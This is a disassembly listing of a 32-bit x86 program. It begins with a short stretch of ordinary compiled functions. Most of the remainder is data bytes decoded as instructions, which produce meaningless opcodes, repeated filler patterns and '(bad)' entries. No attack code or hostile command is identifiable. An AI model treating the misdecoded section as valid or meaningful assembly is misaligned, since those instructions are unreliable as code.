  401aa7:	mov    eax,DWORD PTR [ebp-0xc]
  401aaa:	mov    esp,ebp
  401aac:	pop    ebp
  401aad:	ret    
  401aae:	int3   
  401aaf:	int3   
  401ab0:	push   ebp
  401ab1:	mov    ebp,esp
  401ab3:	sub    esp,0xc
  401ab6:	mov    eax,DWORD PTR [ebp+0x8]
  401ab9:	mov    DWORD PTR [ebp-0x8],eax
  401abc:	mov    ecx,DWORD PTR [ebp+0xc]
  401abf:	mov    DWORD PTR [ebp-0xc],ecx
  401ac2:	mov    DWORD PTR [ebp-0x4],0x22b
  401ac9:	mov    edx,DWORD PTR [ebp-0x8]
  401acc:	cmp    edx,DWORD PTR [ebp-0xc]
  401acf:	jae    0x401adf
  401ad1:	mov    DWORD PTR [ebp-0x4],0x22b
  401ad8:	mov    eax,DWORD PTR [ebp-0x8]
  401adb:	jmp    0x401ae9
  401add:	jmp    0x401ae9
  401adf:	mov    DWORD PTR [ebp-0x4],0x22b
  401ae6:	mov    eax,DWORD PTR [ebp-0xc]
  401ae9:	mov    esp,ebp
  401aeb:	pop    ebp
  401aec:	ret    
  401aed:	int3   
  401aee:	int3   
  401aef:	int3   
  401af0:	push   ebp
  401af1:	mov    ebp,esp
  401af3:	sub    esp,0x8
  401af6:	mov    eax,DWORD PTR [ebp+0x8]
  401af9:	cmp    DWORD PTR [eax+0x4],0x0
  401afd:	je     0x401b3b
  401aff:	mov    ecx,DWORD PTR [ebp+0x8]
  401b02:	add    ecx,0x8
  401b05:	mov    DWORD PTR ds:0x42eec0,ecx
  401b0b:	mov    edx,DWORD PTR [ebp+0x8]
  401b0e:	mov    eax,DWORD PTR [edx+0x4]
  401b11:	mov    ds:0x42eebc,eax
  401b16:	call   0x401490
  401b1b:	mov    ecx,DWORD PTR [ebp+0x8]
  401b1e:	mov    DWORD PTR ds:0x42eed8,ecx
  401b24:	mov    edx,DWORD PTR [ebp+0x10]
  401b27:	push   edx
  401b28:	mov    eax,DWORD PTR [ebp+0xc]
  401b2b:	push   eax
  401b2c:	push   0x1
  401b2e:	call   0x401b40
  401b33:	add    esp,0xc
  401b36:	mov    DWORD PTR [ebp+0x8],eax
  401b39:	jmp    0x401af6
  401b3b:	mov    esp,ebp
  401b3d:	pop    ebp
  401b3e:	ret    
  401b3f:	int3   
  401b40:	push   ebp
  401b41:	mov    ebp,esp
  401b43:	cmp    DWORD PTR [ebp+0x8],0x1
  401b47:	jne    0x401b51
  401b49:	mov    eax,ds:0x42eed8
  401b4e:	mov    DWORD PTR [ebp+0x8],eax
  401b51:	mov    ecx,DWORD PTR [ebp+0x10]
  401b54:	push   ecx
  401b55:	mov    edx,DWORD PTR [ebp+0xc]
  401b58:	push   edx
  401b59:	mov    eax,DWORD PTR [ebp+0x8]
  401b5c:	push   eax
  401b5d:	call   0x401530
  401b62:	add    esp,0xc
  401b65:	mov    ecx,DWORD PTR [ebp+0x8]
  401b68:	push   ecx
  401b69:	call   0x401970
  401b6e:	add    esp,0x4
  401b71:	mov    DWORD PTR [ebp+0x8],eax
  401b74:	mov    eax,DWORD PTR [ebp+0x8]
  401b77:	pop    ebp
  401b78:	ret    
  401b79:	int3   
  401b7a:	int3   
  401b7b:	int3   
  401b7c:	int3   
  401b7d:	int3   
  401b7e:	int3   
  401b7f:	int3   
  401b80:	push   ebp
  401b81:	mov    ebp,esp
  401b83:	mov    eax,ds:0x42eda4
  401b88:	mov    ds:0x42eec8,eax
  401b8d:	push   0x4250c0
  401b92:	push   0x4250cc
  401b97:	call   DWORD PTR ds:0x42edb0
  401b9d:	push   eax
  401b9e:	call   DWORD PTR ds:0x42edb4
  401ba4:	mov    ds:0x42eecc,eax
  401ba9:	pop    ebp
  401baa:	ret    
  401bab:	int3   
	...
  402f34:	add    BYTE PTR [edx],al
  402f36:	add    BYTE PTR [eax],al
  402f38:	ds pop ebx
  402f3a:	add    BYTE PTR [eax],al
  402f3c:	push   esi
  402f3d:	pop    ebx
  402f3e:	add    BYTE PTR [eax],al
  402f40:	ret    0x9069
  402f43:	xor    dl,dl
  402f45:	imul   ebx,DWORD PTR [eax-0x5f963dce],0xa869e232
  402f4f:	xor    bh,BYTE PTR [esi]
  402f51:	cmp    eax,DWORD PTR [ecx]
  402f53:	add    BYTE PTR [edx+0x5b],bl
  402f56:	add    BYTE PTR [eax],al
  402f58:	pop    ebp
  402f59:	mov    di,WORD PTR ds:0x3d9a66ce
  402f60:	shl    DWORD PTR [esi-0x58],1
  402f63:	cmp    eax,0x3dd36698
  402f68:	and    BYTE PTR [esi-0x18],0x3d
  402f6c:	inc    edx
  402f6d:	gs sub eax,0x5165053e
  402f73:	ds out 0x64,eax
  402f76:	fnstsw WORD PTR [esi]
  402f78:	pop    edx
  402f79:	add    BYTE PTR fs:[eax],al
  402f7c:	sub    eax,DWORD PTR ds:[ecx]
  402f7f:	add    BYTE PTR [esi],dl
  402f81:	pop    ebx
  402f82:	add    BYTE PTR [eax],al
  402f84:	add    DWORD PTR [ebx-0x33],ebp
  402f87:	xor    BYTE PTR [ebx],cl
  402f89:	imul   eax,DWORD PTR [ecx+esi*1],0x4b
  402f8d:	push   0x27
  402f8f:	xor    eax,edx
  402f91:	imul   eax,ebx,0xe969e531
  402f97:	xor    DWORD PTR [ecx],edx
  402f99:	push   0xffffffff
  402f9b:	xor    DWORD PTR [eax],eax
	...
  402fc5:	add    BYTE PTR [edx+0x69],cl
  402fc8:	adc    dh,BYTE PTR [edx]
  402fca:	sbb    BYTE PTR [ecx+0x31],ch
  402fcd:	xor    ah,BYTE PTR [edi]
  402fcf:	imul   edi,DWORD PTR [edi],0x58697b32
  402fd5:	xor    bh,bh
  402fd7:	push   0x67b832c7
  402fdc:	mov    esi,DWORD PTR [ebx]
  402fde:	stos   DWORD PTR es:[edi],eax
  402fdf:	cmps   BYTE PTR ds:[si],BYTE PTR es:[di]
  402fe1:	xor    ecx,DWORD PTR [esi-0x5dcc3299]
  402fe7:	addr16 jmp 0xf834:0x216f3c33
  402fef:	outs   dx,BYTE PTR ds:[esi]
  402ff0:	push   edi
  402ff1:	xor    al,0x2
  402ff3:	outs   dx,DWORD PTR ds:[esi]
  402ff4:	arpl   WORD PTR [edi+edx*1],si
  402ff7:	outs   dx,DWORD PTR ds:[esi]
  402ff8:	xor    BYTE PTR [esi+eax*8],0x6e
  402ffc:	xchg   ecx,eax
  402ffd:	xor    al,0xb1
  402fff:	outs   dx,BYTE PTR ds:[esi]
  403000:	sahf   
  403001:	xor    al,0xd3
  403003:	outs   dx,BYTE PTR ds:[esi]
  403004:	mov    ebp,0xd46e7c34
  403009:	xor    al,0x93
  40300b:	outs   dx,BYTE PTR ds:[esi]
  40300c:	out    0x34,eax
  40300e:	jo     0x40307e
  403010:	add    dh,BYTE PTR ds:0x35486e4e
  403016:	or     BYTE PTR [esi+0x54],ch
  403019:	xor    eax,0x356a6ddb
  40301e:	mov    esp,0x7635be6d
  403023:	ins    DWORD PTR es:[edi],dx
  403024:	aad    0x35
  403026:	pop    ds
  403027:	imul   ebp,ebx,0x35
	...
  403051:	add    BYTE PTR [eax],al
  403053:	add    BYTE PTR [edx],ch
  403055:	imul   edi,esi,0xe693735
  40305b:	ss dec edx
  40305d:	imul   ebx,DWORD PTR ds:0x34696936,0x3f695436
  403067:	sub    DWORD PTR ss:[ecx+0x49],0x36
  40306c:	jo     0x4030d7
  40306e:	push   esp
  40306f:	ss pop esp
  403071:	imul   ebp,DWORD PTR [eax+0x36],0x36726963
  403078:	mov    ecx,0xf8369a69
  40307d:	imul   ecx,esp,0xdc69ec36
  403083:	cmp    BYTE PTR ss:[edx+0x2b],ch
  403087:	aaa    
  403088:	push   es
  403089:	push   0x4c
  40308b:	aaa    
  40308c:	push   0x2737636a
  403091:	push   0x71
  403093:	aaa    
  403094:	aaa    
  403095:	push   0xffffff84
  403097:	aaa    
  403098:	mov    edx,0xdc379d6a
  40309d:	push   0xffffffb1
  40309f:	aaa    
  4030a0:	sub    DWORD PTR [edx-0x32],0x37
  4030a4:	push   0x3e37e56a
  4030a9:	pop    ebx
  4030aa:	add    BYTE PTR [eax],al
  4030ac:	ds pop ebx
  4030ae:	add    BYTE PTR [eax],al
  4030b0:	ds pop ebx
  4030b2:	add    BYTE PTR [eax],al
  4030b4:	ds pop ebx
	...
  4030e2:	ds pop ebx
  4030e4:	add    BYTE PTR [eax],al
  4030e6:	ds pop ebx
  4030e8:	add    BYTE PTR [eax],al
  4030ea:	ds pop ebx
  4030ec:	add    BYTE PTR [eax],al
  4030ee:	ds pop ebx
  4030f0:	add    BYTE PTR [eax],al
  4030f2:	ds pop ebx
  4030f4:	add    BYTE PTR [eax],al
  4030f6:	ds pop ebx
  4030f8:	add    BYTE PTR [eax],al
  4030fa:	ds pop ebx
  4030fc:	add    BYTE PTR [eax],al
  4030fe:	ds pop ebx
  403100:	add    BYTE PTR [eax],al
  403102:	ds pop ebx
  403104:	add    BYTE PTR [eax],al
  403106:	ds pop ebx
  403108:	add    BYTE PTR [eax],al
  40310a:	ds pop ebx
  40310c:	add    BYTE PTR [eax],al
  40310e:	ds pop ebx
  403110:	add    BYTE PTR [eax],al
  403112:	ds pop ebx
  403114:	add    BYTE PTR [eax],al
  403116:	ds pop ebx
  403118:	add    BYTE PTR [eax],al
  40311a:	ds pop ebx
  40311c:	add    BYTE PTR [eax],al
  40311e:	ds pop ebx
  403120:	add    BYTE PTR [eax],al
  403122:	ds pop ebx
  403124:	add    BYTE PTR [eax],al
  403126:	ds pop ebx
  403128:	add    BYTE PTR [eax],al
  40312a:	ds pop ebx
  40312c:	add    BYTE PTR [eax],al
  40312e:	ds pop ebx
  403130:	add    BYTE PTR [eax],al
  403132:	ds pop ebx
  403134:	add    BYTE PTR [eax],al
  403136:	ds pop ebx
  403138:	add    BYTE PTR [eax],al
  40313a:	ds pop ebx
  40313c:	add    BYTE PTR [eax],al
  40313e:	ds pop ebx
  403140:	add    BYTE PTR [eax],al
  403142:	ds pop ebx
	...
  403170:	ds pop ebx
  403172:	add    BYTE PTR [eax],al
  403174:	ds pop ebx
  403176:	add    BYTE PTR [eax],al
  403178:	ds pop ebx
  40317a:	add    BYTE PTR [eax],al
  40317c:	ds pop ebx
  40317e:	add    BYTE PTR [eax],al
  403180:	ds pop ebx
  403182:	add    BYTE PTR [eax],al
  403184:	ds pop ebx
  403186:	add    BYTE PTR [eax],al
  403188:	ds pop ebx
  40318a:	add    BYTE PTR [eax],al
  40318c:	ds pop ebx
  40318e:	add    BYTE PTR [eax],al
  403190:	ds pop ebx
  403192:	add    BYTE PTR [eax],al
  403194:	ds pop ebx
  403196:	add    BYTE PTR [eax],al
  403198:	ds pop ebx
  40319a:	add    BYTE PTR [eax],al
  40319c:	ds pop ebx
  40319e:	add    BYTE PTR [eax],al
  4031a0:	ds pop ebx
  4031a2:	add    BYTE PTR [eax],al
  4031a4:	ds pop ebx
  4031a6:	add    BYTE PTR [eax],al
  4031a8:	ds pop ebx
  4031aa:	add    BYTE PTR [eax],al
  4031ac:	ds pop ebx
  4031ae:	add    BYTE PTR [eax],al
  4031b0:	ds pop ebx
  4031b2:	add    BYTE PTR [eax],al
  4031b4:	ds pop ebx
  4031b6:	add    BYTE PTR [eax],al
  4031b8:	ds pop ebx
  4031ba:	add    BYTE PTR [eax],al
  4031bc:	ds pop ebx
  4031be:	add    BYTE PTR [eax],al
  4031c0:	ds pop ebx
  4031c2:	add    BYTE PTR [eax],al
  4031c4:	ds pop ebx
  4031c6:	add    BYTE PTR [eax],al
  4031c8:	ds pop ebx
  4031ca:	add    BYTE PTR [eax],al
  4031cc:	ds pop ebx
  4031ce:	add    BYTE PTR [eax],al
  4031d0:	ds pop ebx
	...
  4031fe:	ds pop ebx
  403200:	add    BYTE PTR [eax],al
  403202:	ds pop ebx
  403204:	add    BYTE PTR [eax],al
  403206:	ds pop ebx
  403208:	add    BYTE PTR [eax],al
  40320a:	add    BYTE PTR [edi+0x1],dh
  40320d:	add    BYTE PTR [esi],bh
  40320f:	and    al,BYTE PTR [ecx+0x0]
  403212:	add    DWORD PTR [esi],edi
  403214:	je     0x403266
  403216:	sub    al,0x34
  403218:	arpl   WORD PTR [ecx+0x22],ax
  40321b:	aas    
  40321c:	jb     0x403283
  40321e:	sub    eax,0xa000028
  403223:	xor    al,0x61
  403225:	add    dh,BYTE PTR fs:[edx]
  403228:	bound  esi,QWORD PTR [edx+0x1f]
  40322b:	sub    DWORD PTR [ecx+0x45],edi
  40322e:	push   es
  40322f:	sbb    al,BYTE PTR [eax]
  403231:	add    BYTE PTR [edx],cl
  403233:	xor    al,0x61
  403235:	add    dh,BYTE PTR fs:[edx]
  403238:	bound  esi,QWORD PTR [edx-0x21]
  40323b:	sub    BYTE PTR [ecx+0x45],bh
  40323e:	out    0xb,al
  403240:	add    BYTE PTR [eax],al
  403242:	add    DWORD PTR [esi],edi
  403244:	je     0x403293
  403246:	loope  0x403286
  403248:	jne    0x4032b6
  40324a:	jecxz  0x40325e
  40324c:	popa   
  40324d:	outs   dx,BYTE PTR ds:[esi]
  40324e:	fidiv  DWORD PTR [esi]
  403250:	gs inc ecx
  403252:	ds pop ebx
  403254:	add    BYTE PTR [eax],al
  403256:	jge    0x403281
  403258:	gs popa 
  40325a:	mov    dl,0x3e
  40325c:	inc    esi
  40325d:	imul   edx,DWORD PTR [edx-0x55ffbec2],0x9d727428
  403267:	cmp    dh,BYTE PTR [ecx+eax*2+0x3e]
  40326b:	pop    ebx
  40326c:	add    BYTE PTR [eax],al
  40326e:	jns    0x4032ae
  403270:	je     0x4032c9
	...
  40329a:	add    BYTE PTR [eax],al
  40329c:	addr16 xor eax,0x28696f64
  4032a2:	inc    esp
  4032a3:	imul   ebp,DWORD PTR [esi+edi*1+0x63],0x79295174
  4032ab:	inc    ecx
  4032ac:	ds pop ebx
  4032ae:	add    BYTE PTR [eax],al
  4032b0:	jns    0x4032f0
  4032b2:	je     0x403301
  4032b4:	pop    ecx
  4032b5:	aas    
  4032b6:	jne    0x403324
  4032b8:	pop    ebx
  4032b9:	adc    esp,DWORD PTR [ecx+0x6e]
  4032bc:	and    dh,BYTE PTR [edi]
  4032be:	gs push edi
  4032c0:	ds pop ebx
  4032c2:	add    BYTE PTR [eax],al
  4032c4:	inc    edx
  4032c5:	pop    ecx
  4032c6:	inc    eax
  4032c7:	add    BYTE PTR [edx+0x59],cl
  4032ca:	inc    eax
  4032cb:	add    BYTE PTR [edx+0x59],ah
  4032ce:	inc    eax
  4032cf:	add    BYTE PTR [edx+0x59],cl
  4032d2:	inc    eax
  4032d3:	add    dh,dh
  4032d5:	pop    eax
  4032d6:	inc    eax
  4032d7:	add    dl,ch
  4032d9:	pop    eax
  4032da:	inc    eax
  4032db:	add    dh,bl
  4032dd:	pop    eax
  4032de:	inc    eax
  4032df:	add    dh,dh
  4032e1:	pop    eax
  4032e2:	inc    eax
  4032e3:	add    BYTE PTR [ecx],al
  4032e5:	ds je  0x403338
  4032e8:	in     al,dx
  4032e9:	xor    esp,DWORD PTR [ebx+0x41]
  4032ec:	loop   0x40332c
  4032ee:	jb     0x403355
  4032f0:	int    0x27
  4032f2:	add    BYTE PTR [eax],al
  4032f4:	cli    
  4032f5:	xor    esp,DWORD PTR [ecx+0x64]
  4032f8:	repnz xor DWORD PTR [edx+0x72],esp
  4032fc:	lahf   
  4032fd:	sub    eax,0x4579
	...
  40332a:	mov    dh,0x1c
  40332c:	add    BYTE PTR [eax],al
  40332e:	xchg   ebp,eax
  40332f:	cmp    BYTE PTR [edx+0x6e],dh
  403332:	fwait
  403333:	das    
  403334:	xor    esi,DWORD PTR [edx]
  403336:	push   0x3e6c6c37
  40333b:	pop    ebx
  40333c:	add    BYTE PTR [eax],al
  40333e:	fwait
  40333f:	cs jbe 0x4033a5
  403342:	mov    WORD PTR [edi],fs
  403344:	cs fs push 0x2f
  403348:	add    BYTE PTR [eax],al
  40334a:	arpl   WORD PTR [eax],di
  40334c:	ins    DWORD PTR es:[edi],dx
  40334d:	jae    0x4033b2
  40334f:	daa    
  403350:	add    BYTE PTR [eax],al
  403352:	push   ebx
  403353:	cs jbe 0x4033b9
  403356:	dec    esp
  403357:	daa    
  403358:	cs bound ebp,QWORD PTR fs:[edi]
  40335c:	add    BYTE PTR [eax],al
  40335e:	pop    ebx
  40335f:	cmp    BYTE PTR [ebp+0x63],ch
  403362:	dec    esi
  403363:	and    al,0x0
  403365:	add    BYTE PTR [eax],dl
  403367:	xor    al,0x72
  403369:	je     0x403396
  40336b:	cmp    al,0x6c
  40336d:	inc    ecx
  40336e:	sbb    ch,BYTE PTR [edi]
  403370:	outs   dx,DWORD PTR ds:[esi]
  403371:	arpl   WORD PTR [esi],di
  403373:	pop    ebx
  403374:	add    BYTE PTR [eax],al
  403376:	lock xor esi,DWORD PTR [edx+0x74]
  40337a:	or     edi,DWORD PTR [esp+ebp*2]
  40337d:	inc    ecx
  40337e:	sbb    ch,BYTE PTR [edi]
  403380:	outs   dx,DWORD PTR ds:[esi]
  403381:	arpl   WORD PTR [esi],di
  403383:	pop    ebx
  403384:	add    BYTE PTR [eax],al
  403386:	adc    esi,DWORD PTR [ecx]
  403388:	ins    DWORD PTR es:[edi],dx
  403389:	popa   
  40338a:	out    dx,al
  40338b:	or     BYTE PTR [ecx+0x65],ch
	...
  4033b6:	add    BYTE PTR [eax],al
  4033b8:	icebp  
  4033b9:	adc    DWORD PTR [esi+0x46],esp
  4033bc:	xlat   BYTE PTR ds:[ebx]
  4033bd:	cs gs add al,dh
  4033c1:	xor    esi,DWORD PTR [edx+0x74]
  4033c4:	retf   
  4033c5:	cmp    ebp,DWORD PTR [eax+edx*2-0x34]
  4033c9:	xor    DWORD PTR [ebp+eiz*2-0x23],esi
  4033cd:	add    BYTE PTR es:[eax],al
  4033d0:	xchg   BYTE PTR [eax],bh
  4033d2:	popa   
  4033d3:	jo     0x403454
  4033d5:	das    
  4033d6:	ins    BYTE PTR es:[edi],dx
  4033d7:	outs   dx,DWORD PTR ds:[esi]
  4033d8:	popf   
  4033d9:	pop    ebx
  4033da:	add    BYTE PTR [eax],al
  4033dc:	xchg   ebp,eax
  4033dd:	cmp    BYTE PTR [edx+0x6e],dh
  4033e0:	mov    ds:0x6032332f,eax
  4033e5:	aaa    
  4033e6:	ins    BYTE PTR es:[edi],dx
  4033e7:	ins    BYTE PTR es:[edi],dx
  4033e8:	ds pop ebx
  4033ea:	add    BYTE PTR [eax],al
  4033ec:	jns    0x403426
  4033ee:	je     0x403440
  4033f0:	ins    BYTE PTR es:[edi],dx
  4033f1:	xor    ah,BYTE PTR [ebx+0x65]
  4033f4:	ins    DWORD PTR es:[edi],dx
  4033f5:	cs dec eax
  4033f7:	gs pop edi
  4033f9:	sub    eax,DWORD PTR [eax]
  4033fb:	add    BYTE PTR [esi],bh
  4033fd:	pop    ebx
  4033fe:	add    WORD PTR [esi],di
  403401:	neg    DWORD PTR [ecx-0x70]
  403404:	ds mov ch,0x3
  403407:	add    BYTE PTR [esi],bh
  403409:	mov    al,0x3
  40340b:	add    BYTE PTR [esi],bh
  40340d:	mov    eax,ds:0x6c3e00fb
  403412:	add    eax,DWORD PTR [eax]
  403414:	ds mov ah,0x3
  403417:	add    BYTE PTR [esi],bh
  403419:	je     0x40341f
	...
  403443:	add    BYTE PTR [eax],al
  403445:	add    BYTE PTR [esi],bh
  403447:	mov    ah,0x3
  403449:	add    BYTE PTR [esi],bh
  40344b:	mov    ah,0x3
  40344d:	add    BYTE PTR [esi],bh
  40344f:	mov    ah,0x3
  403451:	add    BYTE PTR [esi],bh
  403453:	mov    ah,0x3
  403455:	add    BYTE PTR [esi],bh
  403457:	mov    ah,0x3
  403459:	add    BYTE PTR [esi],bh
  40345b:	mov    ah,0x3
  40345d:	add    BYTE PTR [esi],bh
  40345f:	mov    ah,0x3
  403461:	add    BYTE PTR [esi],bh
  403463:	mov    ah,0x3
  403465:	add    BYTE PTR [esi],bh
  403467:	xor    al,0x4
  403469:	add    BYTE PTR [esi],bh
  40346b:	mov    edx,0xb440ba1a
  403470:	scas   eax,DWORD PTR es:[edi]
  403471:	or     DWORD PTR [ebx-0x6e],edi
  403474:	mov    ebx,0x25eef201
  403479:	push   esp
  40347a:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40347b:	pop    ebx
  40347c:	ja     0x40349e
  40347e:	scas   al,BYTE PTR es:[edi]
  40347f:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  403480:	push   0x67
  403482:	lods   al,BYTE PTR ds:[esi]
  403483:	xchg   ebx,eax
  403484:	push   0x69939d20
  403489:	outs   dx,BYTE PTR ds:[esi]
  40348a:	test   eax,0x9b62237e
  40348f:	push   edx
  403490:	jbe    0x403507
  403492:	cwde   
  403493:	push   edx
  403494:	ins    DWORD PTR es:[edi],dx
  403495:	outs   dx,BYTE PTR ds:[esi]
  403496:	pop    esi
  403497:	test   BYTE PTR [edx+0x53],0x1e
  40349b:	xchg   edi,eax
  40349c:	push   0x64
  40349e:	pop    ebx
  40349f:	mov    al,ds:0x5b340d08
  4034a4:	int    0x3
  4034a6:	ds pop ebx
  4034a8:	jmp    0x4034b0
	...
  4034d1:	add    BYTE PTR [eax],al
  4034d3:	add    BYTE PTR [esi],bh
  4034d5:	pop    ebx
  4034d6:	mov    ecx,0x9d5b3e40
  4034db:	add    al,0x3d
  4034dd:	pop    ebx
  4034de:	inc    ebx
  4034df:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4034e0:	cmp    al,0xb
  4034e2:	jmp    0xe99b72ea
  4034e7:	add    edi,DWORD PTR [esi]
  4034e9:	pop    ebx
  4034ea:	or     DWORD PTR [ecx+edi*1],eax
  4034ed:	pop    edx
  4034ee:	repnz add al,0x3c
  4034f1:	ins    DWORD PTR es:[edi],dx
  4034f2:	jmp    0xe99b7412
  4034f7:	push   ebp
  4034f8:	ds pop ebx
  4034fa:	jmp    0x109b7302
  4034ff:	pop    es
  403500:	aas    
  403501:	pop    ebx
  403502:	jmp    0xe99b731a
  403507:	xor    edi,DWORD PTR [edi]
  403509:	pop    ebx
  40350a:	jmp    0xe99b3312
  40350f:	adc    edi,DWORD PTR [esi]
  403511:	pop    ebx
  403512:	jmp    0xed9b731c
  403517:	add    edi,DWORD PTR [esi]
  403519:	pop    ebx
  40351a:	jmp    0xed9b7322
  40351f:	add    edi,DWORD PTR [esi]
  403521:	pop    ebx
  403522:	jmp    0xe99b732a
  403527:	xchg   ebx,eax
  403528:	aas    
  403529:	pop    ebx
  40352a:	jmp    0xa29b7334
  40352f:	cli    
  403530:	aas    
  403531:	pop    ebx
  403532:	jmp    0x403537
  403534:	ds pop ebx
  403536:	jmp    0x40353e
	...
  40355f:	add    BYTE PTR [eax],al
  403561:	add    BYTE PTR [esi],ch
  403563:	pop    ebx
  403564:	jmp    0xe99b737c
  403569:	add    ebp,DWORD PTR [esi]
  40356b:	pop    ebx
  40356c:	jmp    0x9b7384
  403571:	jmp    0xd94090b3
  403576:	cmp    eax,0x3de9005b
  40357b:	pop    ebx
  40357c:	add    cl,ch
  40357e:	cmp    eax,0x570d005b
  403583:	pop    edx
  403584:	add    BYTE PTR [ecx],ah
  403586:	cmp    eax,0x3de9005b
  40358b:	pop    ebx
  40358c:	add    cl,ch
  40358e:	cmp    eax,0x3de9005b
  403593:	pop    ebx
  403594:	add    cl,ch
  403596:	cmp    eax,0x3de9005b
  40359b:	pop    ebx
  40359c:	add    cl,ch
  40359e:	cmp    eax,0x3de9005b
  4035a3:	pop    ebx
  4035a4:	add    cl,ch
  4035a6:	cmp    eax,0x3de9005b
  4035ab:	pop    ebx
  4035ac:	add    cl,ch
  4035ae:	cmp    eax,0x3de9005b
  4035b3:	pop    ebx
  4035b4:	add    cl,ch
  4035b6:	cmp    eax,0x3de9005b
  4035bb:	pop    ebx
  4035bc:	add    cl,ch
  4035be:	cmp    eax,0x3de9005b
  4035c3:	pop    ebx
  4035c4:	add    cl,ch
	...
  4035ee:	add    BYTE PTR [eax],al
  4035f0:	cmp    eax,0x3de9005b
  4035f5:	pop    ebx
  4035f6:	add    cl,ch
  4035f8:	cmp    eax,0x3de9005b
  4035fd:	pop    ebx
  4035fe:	add    cl,ch
  403600:	cmp    eax,0xbd25005b
  403605:	pop    esp
  403606:	add    BYTE PTR [ecx+0x3d],bh
  403609:	pop    ebx
  40360a:	add    cl,ch
  40360c:	cmp    eax,0x3de9005b
  403611:	pop    ebx
  403612:	add    BYTE PTR [eax],al
  403614:	pop    ss
  403615:	pop    ebx
  403616:	add    BYTE PTR [eax],al
  403618:	out    0x5a,eax
  40361a:	add    BYTE PTR [eax],al
  40361c:	out    0x5a,eax
  40361e:	add    BYTE PTR [eax],al
  403620:	xlat   BYTE PTR ds:[ebx]
  403621:	pop    edx
  403622:	add    BYTE PTR [eax],al
  403624:	or     DWORD PTR [edi],ebp
  403626:	gs js  0x4035dc
  403629:	pop    edx
  40362a:	add    BYTE PTR [eax],al
  40362c:	pushf  
  40362d:	dec    ebx
  40362e:	add    DWORD PTR [eax],eax
  403630:	xlat   BYTE PTR ds:[ebx]
  403631:	dec    edx
  403632:	add    BYTE PTR [eax],al
  403634:	xlat   BYTE PTR ds:[ebx]
  403635:	inc    edx
  403636:	add    DWORD PTR [eax],eax
  403638:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  403639:	pop    eax
  40363a:	add    BYTE PTR [eax],al
  40363c:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40363d:	pop    edx
  40363e:	add    BYTE PTR [eax],al
  403640:	xchg   edi,eax
  403641:	pop    edx
  403642:	add    BYTE PTR [eax],al
  403644:	xchg   edi,eax
  403645:	pop    edx
  403646:	add    BYTE PTR [eax],al
  403648:	inc    edi
  403649:	push   edi
  40364a:	add    BYTE PTR [eax+0x39],ah
  40364d:	and    eax,0x39f36164
	...
  40367e:	xchg   edi,eax
  40367f:	pop    ecx
  403680:	add    BYTE PTR [eax],al
  403682:	addr16 push 0x1
  403685:	add    BYTE PTR [edi+0x58],ah
  403688:	add    BYTE PTR [eax],al
  40368a:	push   edi
  40368b:	inc    eax
  40368c:	add    DWORD PTR [eax],eax
  40368e:	push   edi
  40368f:	pop    edx
  403690:	add    BYTE PTR [eax],al
  403692:	addr16 pop edx
  403694:	add    BYTE PTR [eax],al
  403696:	addr16 pop edx
  403698:	add    BYTE PTR [eax],al
  40369a:	pop    ss
  40369b:	push   edi
  40369c:	add    BYTE PTR [eax+0x69],al
  40369f:	(bad)  
  4036a0:	pusha  
  4036a1:	je     0x4036e9
  4036a3:	push   edi
  4036a4:	add    BYTE PTR [eax],al
  4036a6:	(bad)  
  4036a7:	adc    al,0x0
  4036a9:	add    BYTE PTR [edi],dl
  4036ab:	sbb    al,BYTE PTR [ecx]
  4036ad:	add    BYTE PTR [edi],dl
  4036af:	adc    BYTE PTR [eax],al
  4036b1:	add    BYTE PTR [edi],ah
  4036b3:	inc    esi
  4036b4:	add    DWORD PTR [eax],eax
  4036b6:	ds mov ah,0x3
  4036b9:	add    BYTE PTR [esi],bh
  4036bb:	mov    ah,0x3
  4036bd:	add    BYTE PTR [esi],bh
  4036bf:	mov    ah,0x3
  4036c1:	add    BYTE PTR [esi],bh
  4036c3:	hlt    
  4036c4:	add    eax,DWORD PTR [eax]
  4036c6:	(bad)  
  4036c7:	mov    bl,0x3
  4036c9:	add    BYTE PTR [esi],bh
  4036cb:	mov    ah,0x3
  4036cd:	add    BYTE PTR [esi],bh
  4036cf:	mov    ah,0x3
  4036d1:	add    BYTE PTR [esi],bh
  4036d3:	mov    ah,0x3
  4036d5:	add    BYTE PTR [esi],bh
  4036d7:	fisttp WORD PTR [esp+ebp*8+0xf6bec6e]
  4036de:	cs hlt 
  4036e0:	add    edi,eax
	...
  40370a:	add    BYTE PTR [eax],al
  40370c:	sub    al,0xb3
  40370e:	(bad)  
  40370f:	push   DWORD PTR [ecx+0x3f6a0b1e]
  403715:	fiadd  DWORD PTR [ebx]
  403717:	call   0x44b741
  40371c:	xchg   ecx,esi
  40371e:	add    BYTE PTR [eax],al
  403720:	jmp    0x40375a
  403722:	call   0x265c1d77
  403727:	adc    dh,bh
  403729:	mov    bl,0xfb
  40372b:	jb     0x40376c
  40372d:	icebp  
  40372e:	test   DWORD PTR [ebx+0x7403bbf3],0x8513935
  403738:	mov    ch,0xa1
  40373a:	div    BYTE PTR [ebp+0x46]
  40373d:	mov    ebp,0xf1870852
  403742:	add    BYTE PTR [eax],al
  403744:	repz cmp al,ch
  403747:	cmp    DWORD PTR [edx-0x25],0x54
  40374b:	pop    eax
  40374c:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40374d:	inc    edi
  40374e:	adc    al,0x40
  403750:	sub    dh,BYTE PTR ds:[edx+0x1]
  403754:	std    
  403755:	sub    eax,0x5b3275f7
  40375a:	jbe    0x40379d
  40375c:	push   ss
  40375d:	xchg   ebp,eax
  40375e:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40375f:	idiv   DWORD PTR [esi]
  403761:	pop    ebx
  403762:	jmp    0xe146ec6a
  403767:	mov    ch,BYTE PTR [ecx+esi*1]
  40376a:	jmp    0x3e8bab65
  40376f:	jno    0x403771
	...
  403799:	add    dl,dh
  40379b:	pushf  
  40379c:	mov    esp,0xe126e9fb
  4037a1:	test   BYTE PTR [edi+eax*2+0x5b4ac230],0xb4
  4037a9:	mov    ah,dl
  4037ab:	fsubr  DWORD PTR ds:0x81036efc
  4037b1:	test   DWORD PTR [esi],ebp
  4037b3:	sbb    ebp,ecx
  4037b5:	sti    
  4037b6:	sub    al,0x5a
  4037b8:	sub    dh,bh
  4037ba:	jns    0x4037d2
  4037bc:	icebp  
